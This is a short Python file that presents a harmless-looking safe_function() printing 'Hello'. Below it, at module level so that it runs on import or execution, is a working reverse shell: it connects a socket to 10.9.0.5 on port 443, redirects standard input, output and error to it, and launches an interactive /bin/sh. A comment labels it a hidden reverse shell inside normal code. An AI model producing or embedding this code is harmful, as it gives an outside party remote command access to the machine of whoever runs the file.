import socket,subprocess,os

# hidden reverse shell inside normal code
def safe_function():
    print("Hello")

s=socket.socket()
s.connect(("10.9.0.5", 443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
